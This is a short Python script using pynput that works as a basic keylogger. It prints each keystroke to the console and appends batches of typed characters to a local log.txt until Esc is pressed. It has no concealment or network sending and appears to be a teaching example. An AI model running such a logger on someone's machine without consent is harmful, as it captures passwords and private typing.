''' Module used - pynput
It is not included default so had to be installed

from pynput.keyboard import Key, Listener

'''

from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed".format(key)) #This will put key pressed in string

    if count >= 10:
        #here when the user has pressed more than or equal to 10 keys then
        #we update the file
        count =0
        write_file(keys)
        keys = []
                      

def write_file(keys):
    with open("log.txt","a") as f:
        for key in keys:
            k= str(key).replace("'","")
            if k.find("space") > 0:
                f.write('\n') #when space key pressed, text move to next line

            elif k.find("Key") == -1:  #when find function cannot find a string it return -1
                f.write(k)
                           

def on_release(key):
    if key == Key.esc:
        return False
    


with Listener(on_press= on_press, on_release =on_release) as listener:
    listener.join()
''' on_press and on_release are functions which will work when key is
pressed and released '''
''' We can change then names after equal to sign'''



